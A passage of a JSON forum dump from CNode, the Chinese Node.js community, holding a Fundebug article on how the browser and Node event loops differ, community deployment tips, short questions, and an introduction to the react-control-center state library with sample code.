的执行。它将不同的任务分配给不同的线程，形成一个 Event Loop（事件循环），以异步的方式将任务的执行结果返回给 V8 引擎。</li>\n<li>V8 引擎再将结果返回给用户。</li>\n</ul>\n<h4>2. 六个阶段</h4>\n<p>其中 libuv 引擎中的事件循环分为 6 个阶段，它们会按照顺序反复运行。每当进入某一个阶段的时候，都会从对应的回调队列中取出函数去执行。当队列为空或者执行的回调函数数量到达系统设定的阈值，就会进入下一阶段。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-005.png\" alt></p>\n<p>从上图中，大致看出 node 中的事件循环的顺序：</p>\n<p>外部输入数据–&gt;轮询阶段(poll)–&gt;检查阶段(check)–&gt;关闭事件回调阶段(close callback)–&gt;定时器检测阶段(timer)–&gt;I/O 事件回调阶段(I/O callbacks)–&gt;闲置阶段(idle, prepare)–&gt;轮询阶段（按照该顺序反复运行）…</p>\n<ul>\n<li>timers 阶段：这个阶段执行 timer（setTimeout、setInterval）的回调</li>\n<li>I/O callbacks 阶段：处理一些上一轮循环中的少数未执行的 I/O 回调</li>\n<li>idle, prepare 阶段：仅 node 内部使用</li>\n<li>poll 阶段：获取新的 I/O 事件, 适当的条件下 node 将阻塞在这里</li>\n<li>check 阶段：执行 setImmediate() 的回调</li>\n<li>close callbacks 阶段：执行 socket 的 close 事件回调</li>\n</ul>\n<p>注意：<strong>上面六个阶段都不包括 process.nextTick()</strong>(下文会介绍)</p>\n<p>接下去我们详细介绍<code>timers</code>、<code>poll</code>、<code>check</code>这 3 个阶段，因为日常开发中的绝大部分异步任务都是在这 3 个阶段处理的。</p>\n<p><strong>(1) timer</strong></p>\n<p>timers 阶段会执行 setTimeout 和 setInterval 回调，并且是由 poll 阶段控制的。\n同样，<strong>在 Node 中定时器指定的时间也不是准确时间，只能是尽快执行</strong>。</p>\n<p><strong>(2) poll</strong></p>\n<p>poll 是一个至关重要的阶段，这一阶段中，系统会做两件事情</p>\n<ul>\n<li>回到 timer 阶段执行回调</li>\n<li>执行 I/O 回调</li>\n</ul>\n<p>并且在进入该阶段时如果没有设定了 timer 的话，会发生以下两件事情</p>\n<ul>\n<li>如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制</li>\n<li>如果 poll 队列为空时，会有两件事发生\n<ul>\n<li>如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调</li>\n<li>如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去</li>\n</ul>\n</li>\n</ul>\n<p>当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。</p>\n<p><strong>(3) check 阶段</strong></p>\n<p>setImmediate()的回调会被加入 check 队列中，从 event loop 的阶段图可以知道，check 阶段的执行顺序在 poll 阶段之后。</p>\n<p>我们先来看个例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#x27;start&#x27;)\nsetTimeout(() =&gt; {\n  console.log(&#x27;timer1&#x27;)\n  Promise.resolve().then(function() {\n    console.log(&#x27;promise1&#x27;)\n  })\n}, 0)\nsetTimeout(() =&gt; {\n  console.log(&#x27;timer2&#x27;)\n  Promise.resolve().then(function() {\n    console.log(&#x27;promise2&#x27;)\n  })\n}, 0)\nPromise.resolve().then(function() {\n  console.log(&#x27;promise3&#x27;)\n})\nconsole.log(&#x27;end&#x27;)\n&#x2F;&#x2F;start=&gt;end=&gt;promise3=&gt;timer1=&gt;timer2=&gt;promise1=&gt;promise2\n</code></pre><ul>\n<li>一开始执行栈的同步任务（这属于宏任务）执行完毕后（依次打印出 start end，并将 2 个 timer 依次放入 timer 队列）,会先去执行微任务（<strong>这点跟浏览器端的一样</strong>），所以打印出 promise3</li>\n<li>然后进入 timers 阶段，执行 timer1 的回调函数，打印 timer1，并将 promise.then 回调放入 microtask 队列，同样的步骤执行 timer2，打印 timer2；这点跟浏览器端相差比较大，<strong>timers 阶段有几个 setTimeout/setInterval 都会依次执行</strong>，并不像浏览器端，每执行一个宏任务后就去执行一个微任务（关于 Node 与浏览器的 Event Loop 差异，下文还会详细介绍）。</li>\n</ul>\n<h4>3. 注意点</h4>\n<p><strong>(1) setTimeout 和 setImmediate</strong></p>\n<p>二者非常相似，区别主要在于调用时机不同。</p>\n<ul>\n<li>setImmediate 设计在 poll 阶段完成时执行，即 check 阶段；</li>\n<li>setTimeout 设计在 poll 阶段为空闲时，且设定时间到达后执行，但它在 timer 阶段执行</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function timeout () {\n  console.log(&#x27;timeout&#x27;);\n},0);\nsetImmediate(function immediate () {\n  console.log(&#x27;immediate&#x27;);\n});\n</code></pre><ul>\n<li>对于以上代码来说，setTimeout 可能执行在前，也可能执行在后。</li>\n<li>首先 setTimeout(fn, 0) === setTimeout(fn, 1)，这是由源码决定的\n进入事件循环也是需要成本的，如果在准备时候花费了大于 1ms 的时间，那么在 timer 阶段就会直接执行 setTimeout 回调</li>\n<li>如果准备时间花费小于 1ms，那么就是 setImmediate 回调先执行了</li>\n</ul>\n<p>但当二者在异步 i/o callback 内部调用时，总是先执行 setImmediate，再执行 setTimeout</p>\n<pre class=\"prettyprint language-javascript\"><code>const fs = require(&#x27;fs&#x27;)\nfs.readFile(__filename, () =&gt; {\n    setTimeout(() =&gt; {\n        console.log(&#x27;timeout&#x27;);\n    }, 0)\n    setImmediate(() =&gt; {\n        console.log(&#x27;immediate&#x27;)\n    })\n})\n&#x2F;&#x2F; immediate\n&#x2F;&#x2F; timeout\n</code></pre><p>在上述代码中，setImmediate 永远先执行。因为两个代码写在 IO 回调中，IO 回调是在 poll 阶段执行，当回调执行完毕后队列为空，发现存在 setImmediate 回调，所以就直接跳转到 check 阶段去执行回调了。</p>\n<p><strong>(2) process.nextTick</strong></p>\n<p>这个函数其实是独立于 Event Loop 之外的，它有一个自己的队列，当每个阶段完成后，如果存在 nextTick 队列，就会清空队列中的所有回调函数，并且优先于其他 microtask 执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(() =&gt; {\n console.log(&#x27;timer1&#x27;)\n Promise.resolve().then(function() {\n   console.log(&#x27;promise1&#x27;)\n })\n}, 0)\nprocess.nextTick(() =&gt; {\n console.log(&#x27;nextTick&#x27;)\n process.nextTick(() =&gt; {\n   console.log(&#x27;nextTick&#x27;)\n   process.nextTick(() =&gt; {\n     console.log(&#x27;nextTick&#x27;)\n     process.nextTick(() =&gt; {\n       console.log(&#x27;nextTick&#x27;)\n     })\n   })\n })\n})\n&#x2F;&#x2F; nextTick=&gt;nextTick=&gt;nextTick=&gt;nextTick=&gt;timer1=&gt;promise1\n</code></pre><h3>五、Node 与浏览器的 Event Loop 差异</h3>\n<p><strong>浏览器环境下，microtask 的任务队列是每个 macrotask 执行完之后执行。而在 Node.js 中，microtask 会在事件循环的各个阶段之间执行，也就是一个阶段执行完毕，就会去执行 microtask 队列的任务</strong>。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-006.png\" alt></p>\n<p>接下我们通过一个例子来说明两者区别：</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(()=&gt;{\n    console.log(&#x27;timer1&#x27;)\n    Promise.resolve().then(function() {\n        console.log(&#x27;promise1&#x27;)\n    })\n}, 0)\nsetTimeout(()=&gt;{\n    console.log(&#x27;timer2&#x27;)\n    Promise.resolve().then(function() {\n        console.log(&#x27;promise2&#x27;)\n    })\n}, 0)\n</code></pre><p>浏览器端运行结果：<code>timer1=&gt;promise1=&gt;timer2=&gt;promise2</code></p>\n<p>浏览器端的处理过程如下：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-007.gif\" alt></p>\n<p>Node 端运行结果：<code>timer1=&gt;timer2=&gt;promise1=&gt;promise2</code></p>\n<ul>\n<li>全局脚本（main()）执行，将 2 个 timer 依次放入 timer 队列，main()执行完毕，调用栈空闲，任务队列开始执行；</li>\n<li>首先进入 timers 阶段，执行 timer1 的回调函数，打印 timer1，并将 promise1.then 回调放入 microtask 队列，同样的步骤执行 timer2，打印 timer2；</li>\n<li>至此，timer 阶段执行结束，event loop 进入下一个阶段之前，执行 microtask 队列的所有任务，依次打印 promise1、promise2</li>\n</ul>\n<p>Node 端的处理过程如下：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-008.gif\" alt></p>\n<h3>六、总结</h3>\n<p>浏览器和 Node 环境下，microtask 任务队列的执行时机不同</p>\n<ul>\n<li>Node 端，microtask 在事件循环的各个阶段之间执行</li>\n<li>浏览器端，microtask 在事件循环的 macrotask 执行完之后执行</li>\n</ul>\n<h3>参考文章</h3>\n<ul>\n<li><a href=\"https://imweb.io/topic/58e3bfa845e5c13468f567d5\">浏览器进程？线程？傻傻分不清楚！</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/PBX_YHw0-f3bbSDH5ZbbJQ?\">事件循环机制的那些事</a></li>\n<li><a href=\"https://juejin.im/book/5b936540f265da0a9624b04b\">前端性能优化原理与实践</a></li>\n<li><a href=\"https://juejin.im/book/5bdc715fe51d454e755f75ef/section/5be04a8e6fb9a04a072fd2cd#heading-3\">前端面试之道</a></li>\n<li><a href=\"http://lynnelv.github.io/js-event-loop-nodejs\">深入理解 js 事件循环机制（Node.js 篇）</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33058983\">详解 JavaScript 中的 Event Loop（事件循环）机制</a></li>\n<li><a href=\"https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/\">event-loop-timers-and-nexttick</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2019/01/15/diffrences-of-browser-and-node-in-event-loop/\">https://blog.fundebug.com/2019/01/15/diffrences-of-browser-and-node-in-event-loop/</a></p>\n</div>","title":"浏览器与Node的事件循环(Event Loop)有何区别?","last_reply_at":"2019-01-15T08:12:44.594Z","good":false,"top":false,"reply_count":6,"visit_count":943,"create_at":"2019-01-15T03:36:47.416Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c3ccbf7a4d44449266b0d9b","author_id":"56cb313d66c88b5e490260a9","tab":"share","content":"<div class=\"markdown-text\"><ol>\n<li>\n<p>改默认图标为怪兽系列吧，至少不那么单调。</p>\n<pre class=\"prettyprint\"><code>var url = this.avatar || (&#x27;https:&#x2F;&#x2F;gravatar.com&#x2F;avatar&#x2F;&#x27; + utility.md5(this.email.toLowerCase()) + &#x27;?size=48&amp;d=monsterid&#x27;);\n</code></pre></li>\n<li>\n<p>手机端不启用markdwon编辑器。手机端web回复实在没法用，搜索了几乎所有markdown编辑器在手机端都支持不好。索性放弃。不使用editor，<strong>目前输入框不随键盘上弹。哪位前端大神可以抽空帮我解决一下感激不尽。</strong></p>\n<pre class=\"prettyprint\"><code>  var isMobile = false;\n  if(...)\n  \t\tisMobile = true;\n  }\n  if (!isMobile) {\n\t  var editor = new Editor();\n\t  editor.render($(&#x27;.editor&#x27;)[0]);\n }\n</code></pre></li>\n<li>\n<p>用Let’s Encrypt做全站https，<a href=\"https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04\">https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04</a></p>\n</li>\n<li>\n<p>部署在国内，不要添加google统计，墙内影响速度。</p>\n</li>\n<li>\n<p>更改avatar为v2ex的cdn，增加响应速度。</p>\n<pre class=\"prettyprint\"><code> return &#x27;http:&#x2F;&#x2F;cdn.v2ex.com&#x2F;gravatar&#x2F;&#x27; + utility.md5(email.toLowerCase()) + &#x27;?size=48&amp;d=monsterid&#x27;;\n</code></pre></li>\n</ol>\n<p>欢迎提出意见，足球教练社区，<a href=\"https://bbs.zuqiuxunlian.com\">https://bbs.zuqiuxunlian.com</a>, fork代码库：<a href=\"https://github.com/zuqiuxunlian/bbs_zuqiuxunlian\">https://github.com/zuqiuxunlian/bbs_zuqiuxunlian</a></p>\n</div>","title":"用cnodejs部署自己的社区的几个Tips","last_reply_at":"2019-01-15T04:43:52.782Z","good":false,"top":false,"reply_count":7,"visit_count":746,"create_at":"2019-01-14T17:50:47.073Z","author":{"loginname":"awong1900","avatar_url":"https://avatars1.githubusercontent.com/u/4022612?v=4&s=120"}},{"id":"5c39ca55a4d44449266b022b","author_id":"5c23175d3898674067a788be","tab":"share","content":"<div class=\"markdown-text\"><p>我用Express做网站的。</p>\n</div>","title":"你们使用Node.js都做什么呢？","last_reply_at":"2019-01-15T03:35:05.345Z","good":false,"top":false,"reply_count":3,"visit_count":938,"create_at":"2019-01-12T11:07:01.963Z","author":{"loginname":"BIXIAOJIE","avatar_url":"https://avatars2.githubusercontent.com/u/18553398?v=4&s=120"}},{"id":"5c3c4419a4d44449266b0a7d","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FrwOKHNwF-DkstZtwQpw91Sjy-UT\" alt=\"image.png\"></p>\n</div>","title":"请问下七牛云存储的图片资源，能不能自动给图片命名~~","last_reply_at":"2019-01-15T03:20:49.827Z","good":false,"top":false,"reply_count":2,"visit_count":752,"create_at":"2019-01-14T08:11:05.352Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c3c5dca3898674067a7f05e","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>请问下 node 有没有好一点的图片处理的 npm 包，可以给图片瘦身等功能</p>\n</div>","title":"请问下 node 有没有好一点的图片处理的 npm 包，可以给图片瘦身等功能","last_reply_at":"2019-01-14T22:34:20.536Z","good":false,"top":false,"reply_count":2,"visit_count":597,"create_at":"2019-01-14T10:00:42.524Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c3b32723898674067a7e9f5","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><h1>C_C welcom to cc world</h1>\n<blockquote>\n<h3>quick-start demo: <a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">https://github.com/fantasticsoul/rcc-simple-demo</a></h3>\n<h3><a href=\"https://github.com/fantasticsoul/react-control-center\">github地址</a></h3>\n<h3>欢迎大家star，给我更大的动力。</h3>\n</blockquote>\n<h2>简介</h2>\n<ul>\n<li>硝烟四起</li>\n</ul>\n<blockquote>\n<p>众所周知，react本身只是非常优雅的解决了视图层渲染工作，但是随着应用越来越大，庞大的react组件群体之间状态相互其实并不是孤立的，需要一个方案管理把这些状态集中管理起来，从而将model和view的边界划分得更加清楚，针对于此，facebook官方对于react状态管理给了一个flux架构并有一套自己的实现，但是社区里并不满足于此，基于对flux的理解各个第三方做着给出了的自己的解决方案，状态管理框架的战争从此拉开序幕，随着redux横空出世，大家默默接受了redux的 dispatch action、hit reducer、comibine new state、render new view的理念，在redux世界里，组件需要关心的状态变化都由props注入进来，connect作为中间的桥梁将react组件与redux关联起来，通过mapStateToProps将redux里定义好的state映射到组件的props上，以此达到让react组件订阅它需要关心的state变化的目的。</p>\n</blockquote>\n<ul>\n<li>一统天下</li>\n</ul>\n<blockquote>\n<p>随着redux生态逐渐完善，大家默认的把redux当做了react状态管理的首选解决方案，所以redux已经在react状态管理框架里一统天下，通过github star发现，另一个流行的状态管理框架mobx页已经锁定第二的位置，用另一种思路来给大家展示原来状态可以这么管理，状态管理的格局似乎基本已经洗牌完成，可是作为redux重度使用者的我并不满足与此，觉得在redux世界里，通过props层层穿透数据，通过provider包裹整个react app应用，只是解决了状态的流动问题，而组件的通信任然非常间接与尴尬，依靠redux来完成不是不可以，只是对比vue，任然觉得少了些什么…</p>\n</blockquote>\n<ul>\n<li>why cc</li>\n</ul>\n<blockquote>\n<p>react-control-center并不是简单的立足于状态管理，而是想为你提供更多的有趣玩法，因为现有的状态管理解决方案已经非常成熟（但是在某些场景未必真的好用），所以cc从一开始设计就让其api对现有的组件入侵非常之小，你可以在redux项目里局部使用cc来把玩cc的状态管理思路，可以从一个组件开始，慢慢在开始渐进式的修改到其他地方，仅仅使用一个register函数，将你的react类注册为cc类，那么从cc类生成的cc实例，将给你带来以下新的特性、新的概念、新的思路。</p>\n<blockquote>\n<p>1 所有cc实例都拥有 <strong>emit</strong> 和 <strong>on</strong> 的能力，无论组件间嵌套关系多复杂，实现组件间通信将会是如此轻松。</p>\n<blockquote>\n<p>实际上实例还拥有更精准的emitIdentity, emitWith, onIdentity方法，让用户基于更精准的力度去发射或者接收。&lt;br/&gt;\nemitIdentity(eventName:string, identity:string, …args), 第一位参数是事件名，第二位参数是认证串，剩余参数是on的handler函数的实际接收参数，当很多相同组件(如以CcClass:BookItem生成了多个CcInstance)订阅了同一个事件，但是你只希望通知其中一个触发handler调用时，emitIdentity就能派上用场了。&lt;br/&gt;\nonIdentity(eventName:string, identity:string, hancler:function),监听emitIdentity发射的事件。&lt;br/&gt;\nemitWith(eventName:string, option?:{module?:string, ccClassKey?:string, identity?:string})从一个更精准的角度来发射事件,寻找指定模块下，指定cc类名的，指定identity的监控函数去触发执行，具体过程这里先略过，先看下面关于模块和cc类的介绍，在回过头来理解这里更容易。&lt;br/&gt;\noff(eventName:string, option?:{module?:string, ccClassKey?:string, identity?:string}),取消监听。&lt;br/&gt;\n这些函数在cc的顶层api里都有暴露，当你的cc app运行起来之后，你可以打开console,输入cc并回车，你会发现这些函数已经全部绑定在window.cc对象下了，你可以直接调用他们来完成快速验证哦，而非通过ccInstance去触发^_^</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>import cc from &#x27;react-control-center&#x27;;\nimport React,{Component, Fragment} from &#x27;react&#x27;;\n\n@cc.register(&#x27;Foo&#x27;)\nclass Foo extends Component{\n    componentDidMount(){\n        this.$$on(&#x27;fooSignal&#x27;,(signal, from)=&gt;{\n            this.setState({signal, from});\n        });\n        &#x2F;&#x2F;cc是不允许一个cc实例里对同一个事件名监听多次的，这里fooSignal监听了两次，cc会默认使用最新的监听函数，所以上面个监听变成了无效的监听\n        this.$$on(&#x27;fooSignal&#x27;,(signal, from)=&gt;{\n            this.setState({signal, from:&#96;--${from}--&#96;});\n        });\n        this.$$on(&#x27;fooSignalWithIdentity&#x27;, &#x27;xxx_id_wow&#x27;,()=&gt;{\n            this.setState({signal, from});\n        })\n    }\n}\n@cc.register(&#x27;Bar&#x27;)\nclass Bar extends Component{\n    render(){\n        &lt;div&gt;\n            &lt;button onClick={()=&gt;this.$$emit(&#x27;fooSignal&#x27;, &#x27;hello&#x27;, &#x27;Bar&#x27;)}&gt;emit&lt;&#x2F;button&gt;\n            &lt;button onClick={()=&gt;this.$$emit(&#x27;fooSignal&#x27;, &#x27;xxx_id_wow&#x27;, hello&#x27;, &#x27;Bar&#x27;)}&gt;emitIdentity&lt;&#x2F;button&gt;\n            &lt;button onClick={()=&gt;this.$$off(&#x27;fooSignal&#x27;)}&gt;off event fooSignal&lt;&#x2F;button&gt;\n        &lt;&#x2F;div&gt;\n    }\n}\n</code></pre><hr>\n<blockquote>\n<blockquote>\n<p>2 所有cc实例都可以针对自己的state的任意key定义 <strong>computed</strong> 函数，cc会在key的值发生变化自动计算新的computed值并缓存起来，在实例里定义的computed会收集到实例的refComputed对象里。</p>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>import cc from &#x27;react-control-center&#x27;;\nimport React,{Component, Fragment} from &#x27;react&#x27;;\n\n@cc.register(&#x27;Foo&#x27;)\nclass Foo extends Component{\n    constructor(props, context){\n        super(props, context);\n        this.state = {woo:&#x27;woo cc!&#x27;};\n    }\n    $$computed(){\n        return {\n            wow(wow){\n                return &#96;computed wow ${wow}&#96;;\n            }\n        }\n    }\n    componentDidMount(){\n        this.$$on(&#x27;fooSignal&#x27;,(signal, from)=&gt;{\n            this.setState({signal, from});\n        });\n    }\n    changeWow = (e)=&gt;{\n        this.setState({wow: e.currentTarget.value});\n    }\n    render(){\n        return (\n            &lt;div&gt;\n                &lt;span&gt;{this.state.wow}&lt;&#x2F;span&gt;\n                &lt;span&gt;{this.$$refComputed.wow}&lt;&#x2F;span&gt;\n                &lt;input value={this.state.wow} onChange={this.changeWow}&#x2F;&gt;\n            &lt;&#x2F;div&gt;\n        );\n    }\n}\n</code></pre><hr>\n<blockquote>\n<blockquote>\n<p>3 注册为cc类的时候，为该cc类设定了一个该cc类所属的 <strong>模块</strong> ，并通过sharedStateKeys声明关心该模块里哪些key（可以是任意的key，也可以是这个模块的所有key）的变化,则由改cc类产生的cc实例共同监听着这些key对应值的变化，任何一个cc实例改变了这些sharedStateKeys里的值，其他cc实例都能感知到它的变化并自动被cc触发渲染。</p>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>import cc from &#x27;react-control-center&#x27;;\nimport React,{Component, Fragment} from &#x27;react&#x27;;\n\nclass Foo extends Component{\n    render(){\n        return &lt;div&gt;any jsx fragment here&lt;&#x2F;div&gt;\n    }\n}\n\n&#x2F;&#x2F;将Foo注册为一个共享FooOfM1模块所有key变化的cc类FooOfM1\nconst FooOfM1 = cc.register(&#x27;FooOfM1&#x27;, {module:&#x27;M1&#x27;, sharedStateKeys:&#x27;all&#x27;})(Foo);\n&#x2F;&#x2F;将Foo注册为一个共享FooOfM2模块key1和key2变化的cc类FooOfM2\nconst FooOfM2 = cc.register(&#x27;FooOfM2&#x27;, {module:&#x27;M2&#x27;,sharedStateKeys:[&#x27;key1&#x27;,&#x27;key2&#x27;]})(Foo);\n&#x2F;&#x2F;将Foo注册为一个共享FooOfM2模块key1和key2变化,且共享global模块g1变化的cc类FooOfM2G\nconst FooOfM2G = cc.register(&#x27;FooOfM2&#x27;, {module:&#x27;M2&#x27;,sharedStateKeys:[&#x27;key1&#x27;,&#x27;key2&#x27;,&#x27;key3&#x27;],globalStateKeys:[&#x27;g1&#x27;]})(Foo);\n&#x2F;&#x2F;不设定任何参数，只写cc类名，cc会把Foo注册为一个属于default模块的cc类\nconst JustWantToOwnCcAbility = cc.register(&#x27;JustWantToOwnCcAbility&#x27;)(Foo);\n\n&#x2F;&#x2F;cc同时也为register提供简写函数\n&#x2F;&#x2F;const FooOfM2G = cc.r(&#x27;FooOfM2&#x27;,{m:&#x27;M2&#x27;,s:[&#x27;key1&#x27;,&#x27;key2&#x27;,&#x27;key3&#x27;],g:[&#x27;g1&#x27;]})(Foo})\n</code></pre><hr>\n<blockquote>\n<blockquote>\n<p>4 注意在3里我们提到一个概念 <strong>模块</strong>，对于cc来说一个完整的模块包括以下属性：state、reducer、init、computed，这些参数都是调用cc.startup时注入，注意，cc虽然不需要用户像redux那样要给顶层App组件包裹一层&lt;Provider/&gt;但是要求用户在app入口文件的第一句话那里触发cc.startup 让整个cc运行起来，store、reducer、init、computed就是cc.startup需要的参数&lt;br/&gt;</p>\n</blockquote>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16847240efb2940f?w=1174&amp;h=650&amp;f=png&amp;s=45126\" alt></p>\n<blockquote>\n<blockquote>\n<ul>\n<li>store是一个object对象，store里的各个key就表示模块名，对应的值就是各个模块对应的state，一个cc实例除了setState方法能够触发修改state，还可以通过dispatch方法派发action对象去修改state，此时具体的数据合成逻辑就体现在下面要说的reducer里了</li>\n<li>recuder是一个object对象，recuder里的各个key表示reducer的模块名，通常用户可以定义和state的模块名保持一致，但是可以定义另外的模块名，所以这里的模块指的是reducerModuel,不强求用户定义时和stateModule保持一致，stateModule对应的值一个普通的json对象，key为函数名，值为处理函数，即处理旧state并合成新state的方法，cc支持函数为普通函数、生成器函数、async函数。&lt;br/&gt;</li>\n</ul>\n<blockquote>\n<p>上面提到了dispatch函数需要传递一个action对象，一个标准的action必须包含type、payload 2个属性，表示cc要去查recuder里某个模块下type映射函数去修改某个模块的state，具体是什么模块的type映射函数和什么模块对应的state，参见action剩余的两个可缺省的属性module和reducerModule的设定规则，注意，这里再一次提到了reducerModule，以下规则就体现了为什么cc允许reducer模块名可以自由定义：&lt;br/&gt;\n不指定module和reducerModule的话，cc去查reducer里当前cc实例所属模块下的type映射函数去修改当前cc实例所属模块的state。&lt;br/&gt;\n指定了module，而不指定reducerModule的话，cc去查reducer里module下的type映射函数去修改module模块的state。&lt;br/&gt;\n不指定module，指定reducerModule的话，cc去查reducer里reducerModule下type映射函数去修改当前触发dispatch函数的cc实例所属的module模块的state。\n指定了module，同时也指定了reducerModule的话，cc去查reducer里reducerModule下type映射函数去修改module模块的state。&lt;br/&gt;\n之所以这样设计是因为考虑到让用户可以自由选择reducer的模块描述方式，因为对于cc来说，dispatch派发的action只是为了准确找到reducer里的处理函数，而reducer的模块定义并不需要强制和state保持一致给了用户更多的选择去划分reducer的领域</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<ul>\n<li>init是一个object对象，key是模块名，严格对应stateModule，值是一个函数，如果用户为某个模块定义了init函数表示用户希望有机会再次初始化某个模块的state，通常是异步请求后端来的数据重新赋值给模块对应的state&lt;br/&gt;</li>\n<li>computed是一个object对象，key是模块名，严格对应stateModule，值是一个moduleComputedObject,moduleComputedObject的key指的就是某个module的某个key，value就是为这个key定义的计算函数，函数的第一为参数就是key的原始值，cc实例里通过moduleComputed对象取到计算后的新值，特别地，为global模块定义的moduleComputedObject对象，在cc实例里通过globalComputed对象取到计算后的新值</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;code in index.js\nimport api from &#x27;@foo&#x2F;bar&#x2F;api&#x27;;\n\ncc.startup({\n    isModuleMode:true,&#x2F;&#x2F;表示cc以模块化方式启动，默认是false，cc鼓励用户使用模块化管理状态，更容易划分领域的边界\n    store:{\n        $$global{&#x2F;&#x2F;$$global是cc的内置模块，用户如果没有显式的定义，cc会自动注入一个，只不过是一个不包含任何key的对象\n            themeColor:&#x27;pink&#x27;,\n        },\n        m1:{\n            name:&#x27;zzk&#x27;,\n            age:30,\n            books:[],\n            error:&#x27;&#x27;,\n        },\n        m2:{\n            wow:&#x27;wow&#x27;,\n            signal:&#x27;haha&#x27;,\n        }\n    },\n    reducer:{\n        m1:{\n            &#x2F;&#x2F;state表示调用dispatch的cc实例对应的state，moduleState只描述的是cc实例所属的模块的state，更多的解释看下面的4 5 6 7 8这些点。\n            &#x2F;&#x2F;特别的注意，如果该方法是因为某个reducer的函数里调用的dispatch函数而被触发调用的，此时的state始终指的是最初的那个在cc实例里触发dispatch时那个cc实例的state，而moduleState始终指向的是指定的module的的state！！！\n            changeName:function({payload,state,moduleState,dispatch}){\n                const newName = payload;\n                dispatch({module:&#x27;m2&#x27;,type:&#x27;changeSignal&#x27;,payload:&#x27;wow!dispatch in reducer function block&#x27;});\n                return {name:newName};\n            },\n            &#x2F;&#x2F;支持生成器函数\n            changeAge:function*({payload,state,moduleState,dispatch}){\n                const newAge = payload;\n                const result = yield api.verifyAge(newAge);\n                if(result.error)return({error:result.error});\n                else return {name:newName};\n            },\n            &#x2F;&#x2F;支持async\n            changeAge:async function({payload:{pageIndex,pageSize}}){\n                const books = yield api.getBooks(pageIndex, pageSize);\n                return {books};\n            }\n        },\n        m2:{\n            changeSignal:function({payload:signal,dispatch}){\n                &#x2F;&#x2F;注意m1&#x2F;changeName里指定了修改m2模块的数据，其实这里可以一次性return {signal, wow:&#x27;just show reducerModule&#x27;}来修改数据，\n                &#x2F;&#x2F;但是故意的调用dispatch找whatever&#x2F;generateWow来触发修改m2的wow值，是为了演示显示的指定reducerModule的作用\n                dispatch({module:&#x27;m2&#x27;,reducerModule:&#x27;whatever&#x27;,type:&#x27;generateWow&#x27;,payload:&#x27;just show reducerModule&#x27;})\n                return {signal};\n            }\n        },\n        whatever:{&#x2F;&#x2F;一个刻意和stateModule没有保持一致的reducerModule\n            generateWow:function({payload:wow}){\n               return {wow};\n            }\n        },\n        $$global:{&#x2F;&#x2F;为global模块指定reducer函数\n            changeThemeColor:function({payload:themeColor}){\n                return {themeColor}\n            }\n        }\n    },\n    init:{\n        $$global:setState=&gt;{&#x2F;&#x2F;为global模块指定state的初始化函数\n            api.getThemeColor().then(themeColor=&gt;{\n                setState({themeColor})\n            }).catch(err=&gt;console.log(err))\n        }\n    },\n    computed:{\n        m1:{\n            name(name){&#x2F;&#x2F;reverse name\n                return name.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);\n            }\n        }\n    }\n})\n\n</code></pre><hr>\n<blockquote>\n<blockquote>\n<p>4 注意第3点里，注册一个react类到某个模块里成为cc类时，sharedStateKeys可以是这个模块里的任意key，因为cc允许注册不同的react类到同一个模块，例如模块M里拥有5个key为f1、f2、f3、f4、f5, ccClass1通过sharedStateKeys观察模块M的f1、f2, ccClass2通过sharedStateKeys观察模块M的f2、f3、f4，当ccClass1的某个实例改变了f2的值，那么ccClass1的其他实例和ccClass2的所有实例都能感知到f2的变化并被cc触发渲染。&lt;br/&gt;\n5 cc有一个内建的global模块，所有的ccClass都天生的拥有观察global模块key值变化的能力，注册成为cc类时通过globalStateKeys观察模块global里的任意key。&lt;br/&gt;\n6 所有cc实例上可以通过prop 